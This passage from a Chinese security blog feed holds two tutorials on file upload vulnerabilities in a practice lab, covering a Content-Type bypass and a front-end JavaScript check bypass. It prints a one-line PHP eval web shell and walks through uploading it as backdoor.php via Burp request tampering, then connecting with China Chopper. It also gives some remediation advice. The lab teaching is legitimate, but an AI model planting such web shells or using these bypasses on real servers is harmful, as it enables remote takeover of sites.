表示可以被分多个子类的独立类别。</li>\n<li><code>subtype</code>  表示细分后的每个类型</li>\n</ul>\n<p>独立类型如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">text/plain</span><br><span class=\"line\">text/html</span><br><span class=\"line\">image/jpeg</span><br><span class=\"line\">image/png</span><br><span class=\"line\">audio/mpeg</span><br><span class=\"line\">audio/ogg</span><br><span class=\"line\">audio/*</span><br><span class=\"line\">video/mp4</span><br><span class=\"line\">application/*</span><br><span class=\"line\">application/json</span><br><span class=\"line\">application/javascript</span><br><span class=\"line\">application/ecmascript</span><br><span class=\"line\">application/octet-stream</span><br><span class=\"line\">…</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003135647652.png\" alt=\"image-20221003135647652\"></p>\n<p>上传文件的时候，Content-Type 有两类标识：</p>\n<ul>\n<li>标识文件上传的请求 multipart/form-data【可用于 <code>HTML表单</code> 从浏览器发送信息给服务器】</li>\n<li>标识文件类型 application/octet-stream 【这是应用程序文件的默认值。意思是 <code>未知的应用程序文件</code> ，浏览器一般不会自动执行或询问执行】</li>\n</ul>\n<p>了解了基本上传格式后，查看源码内容【单击 “显示源码” 按钮】</p>\n<p><img src=\"image-20221003140629128.png\" alt=\"image-20221003140629128\"></p>\n<p>这一段的主要逻辑：</p>\n<ul>\n<li>\n<p>定义 <code>$is_upload</code>  变量，默认值为 false</p>\n</li>\n<li>\n<p>定义 <code>$msg</code>  变量，默认值为空</p>\n</li>\n<li>\n<p><code>isset</code>  函数判断 <code>submit的POST请求</code> 是否为空</p>\n<ul>\n<li>如果为空，什么都不做</li>\n<li>如果不为空，则继续往下走</li>\n</ul>\n</li>\n<li>\n<p>判断 <code>UPLOAD_PATH</code>  上传目录是否存在</p>\n<ul>\n<li>如果不存在，则返回 “文件夹不存在，请手工创建”</li>\n<li>如果存在，则继续往下走</li>\n</ul>\n</li>\n<li>\n<p>判断 <code>upload_file</code>  的 type 的字段的值是否为 image/jpeg 、png、gif 中的任意一个</p>\n<ul>\n<li>如果不是，则返回 &quot;文件类型不正确，请重新上传&quot;</li>\n<li>如果是，则继续往下走</li>\n</ul>\n</li>\n<li>\n<p>定义一个 <code>$temp_file</code>  变量，接收 <code>upload_file</code>  的 <code>tmp_name</code>  字段的值</p>\n<ul>\n<li>\n<p><code>$ _FILES ['upload_file']</code>  表示内置名为 <code>upload_file</code>  的 <code>FILES数组</code></p>\n</li>\n<li>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name type-declaration\">PHP</span> <span class=\"token variable\">$_FILES</span> 是一个预定义的数组，用来获取通过 <span class=\"token constant\">POST</span> 方法上传文件的相关信息。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>如果为单个文件上传，那么 <span class=\"token variable\">$_FILES</span> 为二维数组；</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>如果为多个文件上传，那么 <span class=\"token variable\">$_FILES</span> 为三维数组。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$_FILES</span>数组内容如下<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span> 客户端文件的原名称。 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span> 文件的 <span class=\"token constant\">MIME</span> 类型，需要浏览器提供该信息的支持，例如<span class=\"token string double-quoted-string\">\"image/gif\"</span>。 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span> 已上传文件的大小，单位为字节。 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span> 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php<span class=\"token operator\">.</span>ini的upload_tmp_dir 指定，但用<span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数设置是不起作用的。 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span> 和该文件上传相关的错误代码。<span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span> 是在 <span class=\"token constant\">PHP</span> <span class=\"token number\">4.2</span><span class=\"token number\">.0</span> 版本中增加的。下面是它的说明：<span class=\"token punctuation\">(</span>它们在<span class=\"token constant\">PHP3</span><span class=\"token number\">.0</span>以后成了常量<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li>\n<p>定义一个 img_path 变量，接收 UPLOAD_PATH+’/’+upload_file 关联信息中 name 字段的值</p>\n<ul>\n<li><code>['name']</code>  是表示 <code>文件&quot;在上传者机器上&quot;的文件名</code>  ，或者叫 <code>客户端文件的原名称</code></li>\n</ul>\n</li>\n<li>\n<p>判断 <code>move_uploaded_file</code>  的返回值，其函数原型为 <code>move_uploaded_file( string file, string dest)</code> ，意为 <code>将上传的file移动到dest</code></p>\n<ul>\n<li>如果临时文件 <code>$temp_file</code>  成功移动到 <code>$img_path</code>  当中【<strong>相当于 linux 的 mv 指令</strong>】，那么就令 <code>$is_upload</code>  为 <code>true</code> ，并返回 &quot;上传 Success！&quot;</li>\n<li>如果没有移动成功，则返回 “上传出错！”</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"content-type绕过\"><a class=\"markdownIt-Anchor\" href=\"#content-type绕过\">#</a> content-type 绕过</h2>\n<p>抓包后将 <code>Content-type字段的值</code> 修改为 <code>image/jpeg</code> 、 <code>image/png</code> 、 <code>image/gif</code>  的任何一种即可实现绕过。</p>\n<p><img src=\"image-20221003144019576.png\" alt=\"image-20221003144019576\"></p>\n<p>修改如下</p>\n<p><img src=\"image-20221003144200588.png\" alt=\"image-20221003144200588\"></p>\n<p><strong>点击 Forward，提示 &quot;上传 Success！&quot;</strong></p>\n<p><img src=\"image-20221003144223909.png\" alt=\"image-20221003144223909\"></p>\n<p>至此，content-type 验证审计 + 绕过演示完毕。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%89%8D%E5%8F%B0JS%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%89%8D%E5%8F%B0JS%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/",
            "title": "前台JS验证审计+绕过",
            "date_published": "2022-10-02T16:34:47.000Z",
            "content_html": "<h1 id=\"文件上传漏洞\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞\">#</a> 文件上传漏洞</h1>\n<p>在讲前台 JS 绕过之前，由于是文件上传漏洞探究系列的第一讲，先来简单介绍一下文件上传漏洞。</p>\n<h2 id=\"文件上传漏洞的原因\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞的原因\">#</a> 文件上传漏洞的原因</h2>\n<ul>\n<li>对于上传文件的后缀名 (扩展名) 没有做较为严格的限制</li>\n<li>对于上传文件的 MIMETYPE (content-type，用于描述文件类型的一种描述方法)，没有做检查</li>\n<li>权限上没有对于上传的文件目录设置不可执行权限</li>\n<li>web server 对于上传文件或者指定目录的行为没有做限制。</li>\n</ul>\n<p>​\t在 Web 中进行文件上传的原理是通过将表单设置为 <code>multipart/form-data</code> ，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段（<strong>multipart</strong>）的数据信息，并将其中的文件内容提取出来并保存。</p>\n<p>​\t通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名（为了防止重复），并且加上原始文件的扩展名来保存到服务器上。</p>\n<h2 id=\"文件上传漏洞的危害\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞的危害\">#</a> 文件上传漏洞的危害</h2>\n<ul>\n<li>上传 web 木马文件、控制 web 服务器文件、远程命令执行等</li>\n<li>上传系统病毒、木马文件进行挖矿、僵尸网络</li>\n<li>上传系统溢出程序进行权限提升</li>\n<li>修改 web 页面实现钓鱼、挂马、暗链等操作</li>\n<li>内网渗透</li>\n<li>在权限得到提升的情况下，想做什么就做什么</li>\n</ul>\n<h2 id=\"文件上传合法性检测方法\"><a class=\"markdownIt-Anchor\" href=\"#文件上传合法性检测方法\">#</a> 文件上传合法性检测方法</h2>\n<ul>\n<li>前端 Js 验证</li>\n<li>MIME 类型验证</li>\n<li>黑名单 / 白名单</li>\n<li>检查文件内容 (getimagesize () 函数用于获取图像信息、校验关键字)</li>\n<li>禁止本地文件包含漏洞</li>\n<li>使用安全的 web 服务 (Apache、nginx (/test.png/xxx.php)、IIS 解析漏洞 (1.php;jpg))</li>\n</ul>\n<h2 id=\"文件上传漏洞8种常见绕过方法\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞8种常见绕过方法\">#</a> 文件上传漏洞 8 种常见绕过方法</h2>\n<p>（整体会有 20 多种，这里列举常见 8 种）</p>\n<ul>\n<li>前端 Js 绕过</li>\n<li>MIME 类型绕过</li>\n<li>后缀名大小写绕过 /php4、php5</li>\n<li>00 截断</li>\n<li>覆盖.htaccess</li>\n<li>Windows 文件流特性绕过</li>\n<li>双写文件名绕过</li>\n<li>条件竞争</li>\n</ul>\n<h2 id=\"文件下载漏洞概念\"><a class=\"markdownIt-Anchor\" href=\"#文件下载漏洞概念\">#</a> 文件下载漏洞概念</h2>\n<ul>\n<li>一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</li>\n<li>下载服务器任意文件，如脚本代码、服务及系统配置文件等可用得到的代码进一步做代码审计，得到更多可利用漏洞。</li>\n</ul>\n<h2 id=\"如何查找任意文件下载漏洞呢\"><a class=\"markdownIt-Anchor\" href=\"#如何查找任意文件下载漏洞呢\">#</a> 如何查找任意文件下载漏洞呢？</h2>\n<p>查找传入文件名的参数：</p>\n<ul>\n<li>导入文件等参数，要是直接输入文件名，就有可能有注入点。</li>\n</ul>\n<p>注意如下几个参数名：</p>\n<ul>\n<li>RealPath, FilePath, filepath, Path, path, inputFile, url, urls, Lang, dis, data, readfile, filep</li>\n<li>src, menu, META-INF, WEB-INF</li>\n</ul>\n<p>代码中如何查找漏洞：</p>\n<p>PHP 为例，有如下代码，就有可能存在任意文件下载漏洞</p>\n<ul>\n<li>readfile</li>\n<li>fopen</li>\n<li>file_get_contents</li>\n</ul>\n<h2 id=\"windows敏感文件路径\"><a class=\"markdownIt-Anchor\" href=\"#windows敏感文件路径\">#</a> Windows 敏感文件路径</h2>\n<p><img src=\"image-20221003011837881.png\" alt=\"image-20221003011837881\"></p>\n<h2 id=\"linux敏感文件路径\"><a class=\"markdownIt-Anchor\" href=\"#linux敏感文件路径\">#</a> Linux 敏感文件路径</h2>\n<p><img src=\"image-20221003011901170.png\" alt=\"image-20221003011901170\"></p>\n<h2 id=\"修复文件下载漏洞\"><a class=\"markdownIt-Anchor\" href=\"#修复文件下载漏洞\">#</a> 修复文件下载漏洞</h2>\n<p>PHP 为例：</p>\n<ul>\n<li>过滤.(点)，使用户在 url 种不能回溯上级目录</li>\n<li>正则严格判断用户输入参数的格式</li>\n<li>php.ini 配置 open_basedir 限定文件访问范围</li>\n</ul>\n<p>OK，进入主题</p>\n<h1 id=\"配置虚拟主机\"><a class=\"markdownIt-Anchor\" href=\"#配置虚拟主机\">#</a> 配置虚拟主机</h1>\n<p>虚拟主机，能够将我们的多个 apache 做成域名的方式访问。</p>\n<p>打开 phpStudyB\\Apache\\conf\\httpd.conf 文件，一共修改两处：</p>\n<ul>\n<li>取消 LoadModule 关于 vhost_alias 的注释</li>\n</ul>\n<p><img src=\"image-20221003113249079.png\" alt=\"image-20221003113249079\"></p>\n<ul>\n<li>取消 Virtual hosts 的 Include 所在行注释</li>\n</ul>\n<p><img src=\"image-20221003113333330.png\" alt=\"image-20221003113333330\"></p>\n<p>再打开 C:\\phpStudyB\\Apache\\conf\\extra\\httpd-vhosts.conf 文件</p>\n<p><img src=\"image-20221003113809255.png\" alt=\"image-20221003113809255\"></p>\n<p>接下来就是重启 phpStudy 就行了。</p>\n<h1 id=\"一句话木马\"><a class=\"markdownIt-Anchor\" href=\"#一句话木马\">#</a> 一句话木马</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[abcd]);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>简而言之，就是只有一句代码的木马。@eval 就是执行一些传的参数命令，$_POST 接收我们的 POST 请求，参数的名称是 abcd。总之，就是可以 <code>执行</code> 我们发送的带参数的命令请求。</p>\n<p>功能是实现：数据库管理、生成虚拟终端、文件管理。</p>\n<h1 id=\"前台js验证审计绕过\"><a class=\"markdownIt-Anchor\" href=\"#前台js验证审计绕过\">#</a> 前台 JS 验证审计 + 绕过</h1>\n<h2 id=\"前台js验证审计\"><a class=\"markdownIt-Anchor\" href=\"#前台js验证审计\">#</a> 前台 Js 验证审计</h2>\n<p>上传 backdoor.php (含有一句话木马)</p>\n<p><img src=\"image-20221003124200976.png\" alt=\"image-20221003124200976\"></p>\n<p>ok，我们开始抓包</p>\n<p>启动 BurpSuit，intercept on，结果再次点击上传按钮，却没有抓到任何的包</p>\n<p>我们 F12 看源码进行代码审计</p>\n<h3 id=\"上传按钮代码审计\"><a class=\"markdownIt-Anchor\" href=\"#上传按钮代码审计\">#</a> 上传按钮代码审计</h3>\n<p>首先我们知道，重要的上传逻辑肯定在这些字样的附近：</p>\n<p><img src=\"image-20221003124524219.png\" alt=\"image-20221003124524219\"></p>\n<p>那么我们找到 &quot;<strong> 上传区</strong> &quot;、&quot;<strong> 请选择要上传的图片</strong> &quot; 这个字样，就能精准定位到相关源码附近。</p>\n<p><img src=\"image-20221003124332517.png\" alt=\"image-20221003124332517\"></p>\n<p>上面一段代码的主要逻辑：</p>\n<ul>\n<li>\n<p>属于 <code>form</code>  数据，使用 <code>POST</code>  请求</p>\n</li>\n<li>\n<p>有<strong>两个</strong>输入 <code>input</code> ：</p>\n<ul>\n<li>\n<p>一个是 input_file，类型是 <code>file</code> ，命名为 upload_file，意为待上传的文件。</p>\n</li>\n<li>\n<p>一个是 button，类型是 <code>submit</code> ，命名为 submit，按钮名称为 “上传”</p>\n</li>\n</ul>\n</li>\n<li>\n<p><code>form</code>  请求在点击 submit 时<strong>会触发的方法</strong> —— <code>onsubmit</code></p>\n<ul>\n<li>return checkFile ()：属于 <code>JavaScript(简称Js)</code>  语法，意为将会调用 <code>checkFile()</code> ，并将其结果返回</li>\n<li><code>onsubmit</code>  就是在提交之前<strong>验证上传文件的合法性，属于前端验证</strong></li>\n</ul>\n</li>\n</ul>\n<p>好的，继续来看一下关键的 <code>checkFile()</code>  函数都干了什么：</p>\n<p><img src=\"image-20221003125613717.png\" alt=\"image-20221003125613717\"></p>\n<p><strong>checkFile () 函数主要逻辑：</strong></p>\n<ul>\n<li>\n<p>通过 <code>getElementsByName()</code>  函数，参数为 <code>upload_file</code>  来获取其数组中第一个元素值 (下标从 0 开始)—— 也就是<strong> upload_file 对应的文件</strong>。</p>\n</li>\n<li>\n<p>如果 <code>upload_file对应的文件</code> 为空，那么就弹出 &quot;请选择要上传的文件！&quot;</p>\n</li>\n<li>\n<p>如果非空，则继续往下走</p>\n<ul>\n<li>定义了允许上传的文件类型为 “.jpg| .png| .gif”</li>\n</ul>\n</li>\n<li>\n<p>通过 lastIndexOf 函数获取 <code>最后一个.</code>  出现的位置进行截取字符串，获得的是 <code>最后一个.</code>  右边的字符串 ——<strong> 获得上传文件后缀名</strong></p>\n</li>\n<li>\n<p>判断 <code>上传文件后缀名</code> 是否在刚刚定义的类型里面</p>\n<ul>\n<li>如果不在则弹出 “该文件不允许上传…”，并 return  <code>false</code></li>\n<li>否则 return  <code>true</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"前台js验证绕过\"><a class=\"markdownIt-Anchor\" href=\"#前台js验证绕过\">#</a> 前台 Js 验证绕过</h2>\n<p>我们再次刷新上传页面，使用 BurpSuit 抓到页面返回的源码信息</p>\n<p><img src=\"image-20221003130553004.png\" alt=\"image-20221003130553004\"></p>\n<p>直接找到刚刚定位的 checkFile () 函数，将其内容改成 <code>return true;</code> ，意为<strong>无论什么文件，恒返回真</strong>。</p>\n<p><img src=\"image-20221003130644011.png\" alt=\"image-20221003130644011\"></p>\n<p>点击 &quot;Forward&quot; 按钮。</p>\n<p>然后上传我们的一句话木马，backdoor.php，点击 “上传”，之后就可以成功抓到包。</p>\n<p><img src=\"image-20221003130804344.png\" alt=\"image-20221003130804344\"></p>\n<p>之后一顿 Forward，提交过去。</p>\n<p>显示了我们上传的 php，即上传成功。</p>\n<p><img src=\"image-20221003130947145.png\" alt=\"image-20221003130947145\"></p>\n<p>我们使用中国菜刀连接获取 webshell 即可。</p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        }
    ]
}